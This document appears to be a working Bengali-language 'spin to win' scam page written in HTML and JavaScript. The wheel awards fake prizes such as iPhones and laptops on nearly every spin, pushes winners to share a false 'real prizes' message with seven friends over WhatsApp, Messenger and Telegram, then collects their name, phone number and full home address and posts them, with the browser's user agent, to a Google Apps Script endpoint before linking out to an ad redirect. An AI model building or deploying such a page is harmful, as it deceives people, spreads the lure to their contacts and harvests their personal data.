<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spin to Win! - Grand Prize Edition</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lobster&family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

    <style>
        :root {
            --primary-color: #ff6347;
            --secondary-color: #4682b4;
            --success-color: #32cd32;
            --background-start: #ff7e5f;
            --background-end: #feb47b;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html {
            height: 100%;
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(135deg, var(--background-start), var(--background-end));
            background-size: 200% 200%;
            animation: gradientAnimation 15s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            overflow-y: auto;
        }
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .main-wrapper {
            text-align: center;
            padding: 20px;
            width: 90%;
            max-width: 500px;
            margin: 20px 0;
        }
        h1, h2 {
            font-family: 'Lobster', cursive;
            color: #333;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        h1 { font-size: 3em; margin-bottom: 20px; }
        h2 { font-size: 2.5em; }
        
        .wheel-container {
            position: relative;
            width: 100%;
            max-width: 380px; 
            aspect-ratio: 1 / 1; 
            margin: 20px auto;
        }
        #wheelCanvas {
            width: 100%; height: 100%;
            border-radius: 50%;
            transition: transform 6s cubic-bezier(0.3, 1, 0.4, 1);
            box-shadow: 0 0 20px rgba(0,0,0,0.2), inset 0 0 15px rgba(255,255,255,0.5);
        }
        .pointer {
            position: absolute; top: -15px; left: 50%;
            transform: translateX(-50%);
            width: 0; height: 0;
            border-left: 25px solid transparent;
            border-right: 25px solid transparent;
            border-top: 50px solid var(--primary-color);
            z-index: 10;
            filter: drop-shadow(0 -5px 5px rgba(0,0,0,0.3));
        }
        .btn {
            padding: 15px 40px; font-size: 1.5em;
            font-weight: 700; color: white;
            border: none; border-radius: 50px; cursor: pointer;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
        }
        #spinBtn { background-color: var(--secondary-color); }
        #spinBtn:hover, .claim-btn:hover, .ok-btn:hover { transform: translateY(-3px) scale(1.05); }
        #spinBtn:disabled { background-color: #a0a0a0; cursor: not-allowed; transform: none; box-shadow: none; }

        .share-locker-container, .form-container, .thank-you-container {
            display: none;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 20px; padding: 30px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
        }
        #shareProgress {
            font-size: 1.2em; color: var(--primary-color);
            font-weight: 700; margin-bottom: 25px;
        }
        .share-buttons { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; }
        .share-btn { font-size: 3em; color: #333; transition: transform 0.2s; }
        .share-btn:hover { transform: scale(1.2); }
        #unlockFormBtn { width: 100%; font-size: 1.2em; background-color: var(--success-color); }
        #unlockFormBtn:disabled { background-color: #a0a0a0; }
        
        .form-group { margin-bottom: 15px; text-align: left; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: 700; color: #555; }
        .form-group input, .form-group textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1em; font-family: 'Montserrat', sans-serif; }
        .submit-btn { width: 100%; padding: 15px; font-size: 1.2em; font-weight: 700; color: white; background-color: var(--success-color); border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; }
        .submit-btn:disabled { background-color: #a0a0a0; }

        .thank-you-icon { font-size: 6em; color: var(--success-color); }
        .thank-you-container p { font-size: 1.2em; color: #555; font-weight: 500; }

        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
        .modal-content { background: white; padding: 40px; border-radius: 20px; text-align: center; animation: fadeIn 0.5s ease; width: 90%; max-width: 400px; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
        
        #prizeIcon { font-size: 5em; color: var(--secondary-color); margin-bottom: 15px; }
        #prizeText { font-size: 1.8em; font-weight: 700; color: #333; }
        .claim-btn { background-color: var(--success-color); }

        @media (max-width: 480px) {
            h1 { font-size: 2.2em; }
            h2 { font-size: 2em; }
            .btn { padding: 12px 30px; font-size: 1.2em; }
            #prizeText { font-size: 1.5em; }
            .main-wrapper, .share-locker-container, .form-container, .thank-you-container, .modal-content {
                padding: 20px;
            }
            .share-buttons { gap: 15px; }
            .share-btn { font-size: 2.5em; }
            .pointer {
                border-left-width: 20px;
                border-right-width: 20px;
                border-top-width: 40px;
                top: -10px;
            }
        }
    </style>
</head>
<body>

    <div class="main-wrapper" id="mainWrapper">
        <div id="wheelSection">
            <h1>আপনার ভাগ্য পরীক্ষা করুন!</h1>
            <div class="wheel-container"><canvas id="wheelCanvas" width="500" height="500"></canvas><div class="pointer"></div></div>
            <button id="spinBtn" class="btn" disabled>লোড হচ্ছে...</button>
        </div>
        
        <div class="share-locker-container" id="shareLocker">
            <h2>আর মাত্র এক ধাপ বাকি!</h2><p id="shareProgress">0/7 জন বন্ধুকে শেয়ার করেছেন।</p>
            <div class="share-buttons">
                <a href="#" class="share-btn" data-app="whatsapp"><i class="fab fa-whatsapp" style="color:#25D366;"></i></a>
                <a href="#" class="share-btn" data-app="messenger"><i class="fab fa-facebook-messenger" style="color:#00B2FF;"></i></a>
                <a href="#" class="share-btn" data-app="telegram"><i class="fab fa-telegram" style="color:#0088cc;"></i></a>
            </div>
            <button id="unlockFormBtn" class="btn" disabled>ফর্মটি আনলক করতে শেয়ার করুন</button>
        </div>
        
        <div class="form-container" id="formContainer">
            <h2>পুরস্কার সংগ্রহের জন্য তথ্য দিন</h2>
            <form id="prizeForm">
                <div class="form-group"><label for="name">আপনার নাম</label><input type="text" id="name" name="name" required></div>
                <div class="form-group"><label for="phonenumber">আপনার ফোন নম্বর</label><input type="tel" id="phonenumber" name="phonenumber" required></div>
                <div class="form-group"><label for="address">বিস্তারিত ঠিকানা (গ্রাম/রাস্তা)</label><textarea id="address" name="address" rows="2" required></textarea></div>
                <div class="form-group"><label for="union">ইউনিয়ন</label><input type="text" id="union" name="union" required></div>
                <div class="form-group"><label for="upazila">উপজেলা / থানা</label><input type="text" id="upazila" name="upazila" required></div>
                <div class="form-group"><label for="district">জেলা</label><input type="text" id="district" name="district" required></div>
                <button type="submit" class="submit-btn" id="submitBtn">জমা দিন</button>
            </form>
        </div>

        <div class="thank-you-container" id="thankYouContainer">
            <i class="fas fa-check-circle thank-you-icon"></i>
            <h2>ধন্যবাদ!</h2>
            <p>আপনার তথ্য জমা হয়েছে। আপনার পুরস্কার আগামী ৭২ ঘণ্টার মধ্যে আপনার ঠিকানায় পৌঁছে দেওয়া হবে।</p>
            <a href="https://remarkillustration.com/vsnrrkqbrb?key=875a394a0867b7d59e2cb13e1f009402" target="_blank" class="btn ok-btn" style="background-color: var(--secondary-color); margin-top: 25px; display: inline-block; text-decoration: none;">ঠিক আছে</a>
        </div>
    </div>
    
    <div id="resultModal" class="modal">
        <div class="modal-content">
            <h2 id="modalTitle">অভিনন্দন!</h2><p id="modalSubtitle">আপনি জিতেছেন:</p>
            <div>
                <i id="prizeIcon" class=""></i>
                <p id="prizeText"></p>
            </div><br>
            <button id="claimBtn" class="btn claim-btn">পুরস্কার সংগ্রহ করুন!</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
    <script>
        // =======================================================================================
        //  গুরুত্বপূর্ণ: এই URL টি পরিবর্তন করে আপনার নিজের Google Apps Script URL টি বসান
        // =======================================================================================
        const scriptURL = 'https://script.google.com/macros/s/AKfycbyuIwCqXJ8y8d45Q9ek9XOgdLmtahihDw0MvcemCXeBlAJK6mK9ivOVEolxNnQbWlHQ/exec'; // <-- আপনার URL টি এখানে পেস্ট করুন

        // --- DOM Elements ---
        const wheelSection = document.getElementById('wheelSection'), shareLocker = document.getElementById('shareLocker'), formContainer = document.getElementById('formContainer'), thankYouContainer = document.getElementById('thankYouContainer');
        const shareProgress = document.getElementById('shareProgress'), shareButtons = document.querySelectorAll('.share-btn'), unlockFormBtn = document.getElementById('unlockFormBtn'), prizeForm = document.getElementById('prizeForm'), submitBtn = document.getElementById('submitBtn');
        const canvas = document.getElementById('wheelCanvas'), ctx = canvas.getContext('2d'), spinBtn = document.getElementById('spinBtn');
        const resultModal = document.getElementById('resultModal'), prizeIcon = document.getElementById('prizeIcon'), prizeText = document.getElementById('prizeText'), claimBtn = document.getElementById('claimBtn'), modalTitle = document.getElementById('modalTitle'), modalSubtitle = document.getElementById('modalSubtitle');
        
        let shareCount = 0; const requiredShares = 7;
        
        const segments = [
            { label: 'স্মার্ট ওয়াচ', iconUnicode: '\uf2f2', iconClass: 'fa-solid fa-stopwatch', isWinner: true }, 
            { label: 'Laptop', iconUnicode: '\uf109', iconClass: 'fa-solid fa-laptop', isWinner: true },
            { label: 'রাইস কুকার', iconUnicode: '\ue4c6', iconClass: 'fa-solid fa-bowl-food', isWinner: true },
            { label: 'MacBook', iconUnicode: '\uf109', iconClass: 'fa-solid fa-laptop', isWinner: true },
            { label: 'সেলাই মেশিন', iconUnicode: '\uf0c4', iconClass: 'fa-solid fa-scissors', isWinner: true }, 
            { label: 'iPhone 16 Pro', iconUnicode: '\uf3cd', iconClass: 'fa-solid fa-mobile-screen-button', isWinner: true }, 
            { label: 'ফ্যান', iconUnicode: '\uf863', iconClass: 'fa-solid fa-fan', isWinner: true }, 
            { label: 'Smart TV', iconUnicode: '\uf26c', iconClass: 'fa-solid fa-tv', isWinner: true },
            { label: 'আবার চেষ্টা করুন', iconUnicode: '\uf119', iconClass: 'fa-solid fa-face-frown', isWinner: false },
            { label: 'বাটন ফোন', iconUnicode: '\uf3ce', iconClass: 'fa-solid fa-mobile', isWinner: true },
            { label: 'স্মার্টফোন', iconUnicode: '\uf3cd', iconClass: 'fa-solid fa-mobile-screen-button', isWinner: true },
            { label: 'টর্চলাইট', iconUnicode: '\uf0eb', iconClass: 'fa-solid fa-lightbulb', isWinner: true },
        ];
        
        const segmentCount = segments.length, segmentAngle = 2 * Math.PI / segmentCount;
        let currentRotation = 0, spinning = false;

        function drawWheel() { 
            const radius = canvas.width / 2; 
            ctx.clearRect(0, 0, canvas.width, canvas.height); 
            ctx.save(); 
            ctx.translate(radius, radius); 
            ctx.rotate(currentRotation); 
            segments.forEach((segment, i) => { 
                const colors = ['#FFD700', '#8a2be2', '#f08080', '#dc143c', '#90ee90', '#ff8c00', '#add8e6', '#00ced1', '#ffb6c1', '#dda0dd', '#afeeee', '#ffa500'];
                const angle = i * segmentAngle; 
                ctx.beginPath(); 
                ctx.fillStyle = colors[i % colors.length];
                ctx.moveTo(0, 0); 
                ctx.arc(0, 0, radius, angle, angle + segmentAngle); 
                ctx.lineTo(0, 0); 
                ctx.fill(); 
                ctx.save(); 

                const textAngle = angle + segmentAngle / 2; 
                ctx.rotate(textAngle); 
                
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillStyle = 'black';
                
                const distance = radius * 0.65;
                const iconSize = radius * 0.15;
                const labelSize = radius * 0.07;
                const yOffset = radius * 0.12; 

                ctx.font = `900 ${iconSize}px "Font Awesome 6 Free"`;
                ctx.fillText(segment.iconUnicode, distance, -yOffset / 2);

                ctx.font = `bold ${labelSize}px Montserrat`;
                ctx.fillText(segment.label, distance, yOffset / 2);
                
                ctx.restore(); 
            }); 
            ctx.restore(); 
        }

        function spin() { 
            if (spinning) return; 
            spinning = true; 
            spinBtn.disabled = true; 
            const randomSpins = Math.floor(Math.random() * 5) + 8; 
            const targetAngle = Math.random() * 2 * Math.PI; 
            const totalRotation = randomSpins * 2 * Math.PI + targetAngle; 
            canvas.style.transition = 'transform 6s cubic-bezier(0.3, 1, 0.4, 1)'; 
            canvas.style.transform = `rotate(${totalRotation}rad)`; 
            setTimeout(() => { 
                spinning = false; 
                spinBtn.disabled = false; 
                canvas.style.transition = 'none'; 
                const finalRotation = totalRotation % (2 * Math.PI); 
                canvas.style.transform = `rotate(${finalRotation}rad)`; 
                currentRotation = finalRotation; 
                showPrize(); 
            }, 6000); 
        }
        
        function showPrize() { 
            const degrees = currentRotation * 180 / Math.PI; 
            const normalizedDegrees = (360 - degrees % 360 + 270) % 360; 
            const segmentSize = 360 / segmentCount; 
            const winningIndex = Math.floor(normalizedDegrees / segmentSize); 
            const prize = segments[winningIndex]; 
            
            prizeText.textContent = prize.label;
            prizeIcon.className = prize.iconClass;

            if (prize.isWinner) { 
                modalTitle.textContent = 'অভিনন্দন!'; 
                modalSubtitle.textContent = 'আপনি জিতেছেন:'; 
                claimBtn.textContent = 'পুরস্কার সংগ্রহ করুন!'; 
                claimBtn.onclick = () => { 
                    resultModal.style.display = 'none'; 
                    wheelSection.style.display = 'none'; 
                    shareLocker.style.display = 'block'; 
                    shareCount = 0; 
                    unlockFormBtn.disabled = true; 
                    unlockFormBtn.textContent = 'ফর্মটি আনলক করতে শেয়ার করুন'; 
                    updateShareProgress(); 
                }; 
            } else { 
                modalTitle.textContent = 'দুঃখিত!'; 
                modalSubtitle.textContent = 'চাকাটি থেমেছে এখানে:'; 
                claimBtn.textContent = 'আবার চেষ্টা করুন'; 
                claimBtn.onclick = () => { resultModal.style.display = 'none'; }; 
            } 
            resultModal.style.display = 'flex'; 
        }

        function updateShareProgress() { 
            shareProgress.textContent = `${shareCount}/${requiredShares} জন বন্ধুকে শেয়ার করেছেন।`; 
            if (shareCount >= requiredShares) { 
                unlockFormBtn.disabled = false; 
                unlockFormBtn.textContent = 'আমি শেয়ার করেছি, ফর্মটি আনলক করুন'; 
            } 
        }
        
        shareButtons.forEach(button => { 
            button.addEventListener('click', function(e) { 
                e.preventDefault(); 
                if (shareCount < requiredShares) { 
                    shareCount++; 
                    updateShareProgress(); 
                } 
                const pageUrl = window.location.href;
                const shareText = encodeURIComponent("এই স্পিন হুইলটি সত্যি পুরস্কার দিচ্ছে! আমার ভাগ্য খুলে গেছে, এবার আপনার পালা। এখনই চেষ্টা করে দেখুন! 🎉🎁");
                
                let shareUrl = ''; 
                const app = this.getAttribute('data-app'); 
                if (app === 'whatsapp') shareUrl = `https://api.whatsapp.com/send?text=${shareText}%20${encodeURIComponent(pageUrl)}`; 
                else if (app === 'messenger') shareUrl = `https://www.facebook.com/dialog/send?app_id=145634995501895&link=${encodeURIComponent(pageUrl)}&redirect_uri=${encodeURIComponent(pageUrl)}`; 
                else if (app === 'telegram') shareUrl = `https://t.me/share/url?url=${encodeURIComponent(pageUrl)}&text=${shareText}`; 
                
                window.open(shareUrl, '_blank'); 
            }); 
        });

        unlockFormBtn.addEventListener('click', () => { 
            shareLocker.style.display = 'none'; 
            formContainer.style.display = 'block'; 
        });
        
        prizeForm.addEventListener('submit', (e) => {
            e.preventDefault();
            submitBtn.disabled = true; 
            submitBtn.textContent = 'জমা হচ্ছে...';
            const formData = new FormData(prizeForm);
            formData.append('useragent', navigator.userAgent);
            fetch(scriptURL, { method: 'POST', body: formData })
                .then(response => {
                    formContainer.style.display = 'none';
                    thankYouContainer.style.display = 'block';
                    triggerFireworks();
                })
                .catch(error => {
                    alert('একটি সমস্যা হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।');
                    submitBtn.disabled = false; 
                    submitBtn.textContent = 'জমা দিন';
                });
        });

        function triggerFireworks() { 
            const duration = 5 * 1000, animationEnd = Date.now() + duration, defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 }; 
            function randomInRange(min, max) { return Math.random() * (max - min) + min; } 
            const interval = setInterval(function() { 
                const timeLeft = animationEnd - Date.now(); 
                if (timeLeft <= 0) return clearInterval(interval); 
                const particleCount = 50 * (timeLeft / duration); 
                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } })); 
                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } })); 
            }, 250); 
        }
        
        function initializeWheel() {
            const size = canvas.getBoundingClientRect().width;
            canvas.width = size;
            canvas.height = size;
            drawWheel();
            spinBtn.disabled = false;
            spinBtn.textContent = 'SPIN';
        }

        document.fonts.ready.then(initializeWheel);
        window.addEventListener('resize', initializeWheel);
        spinBtn.addEventListener('click', spin);

    </script>

</body>
</html>
